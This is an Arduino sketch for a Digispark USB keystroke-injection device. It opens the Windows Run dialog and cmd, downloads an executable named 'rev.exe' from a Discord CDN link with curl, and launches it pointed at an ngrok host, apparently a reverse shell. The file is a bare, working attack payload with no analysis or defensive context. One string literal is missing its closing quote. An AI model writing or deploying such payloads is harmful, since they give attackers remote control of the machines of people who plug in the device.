#include "DigiKeyboard.h"

void setup(){
  pinMode(1, OUTPUT);
}

void loop() {
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("curl -o %TEMP%/rev.exe https://cdn.discordapp.com/attachments/1095515004599537775/1147626697613643879/rev.exe);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd /C %TEMP%\rev.exe 9023-2804-1b94-6bc-c000-83ec-fc77-ba8f-55db.ngrok-free.app");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  for (;;) {}
}
